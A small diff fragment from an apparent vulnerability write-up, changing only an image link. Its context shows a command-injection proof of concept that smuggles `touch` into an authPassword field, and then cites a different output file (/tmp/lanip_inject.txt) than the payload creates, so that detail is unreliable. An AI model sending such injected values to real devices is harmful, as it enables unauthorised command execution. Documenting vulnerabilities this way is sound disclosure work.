@@ -72,4 +72,4 @@ authPassword=1`touch$IFS/tmp/setting.txt`
 The file `/tmp/lanip_inject.txt` is created, confirming successful execution of the injected `touch` command.
 
 ![](./imgs/1.png)
-![](./imgs/12.png)
+![](./imgs/2.png)
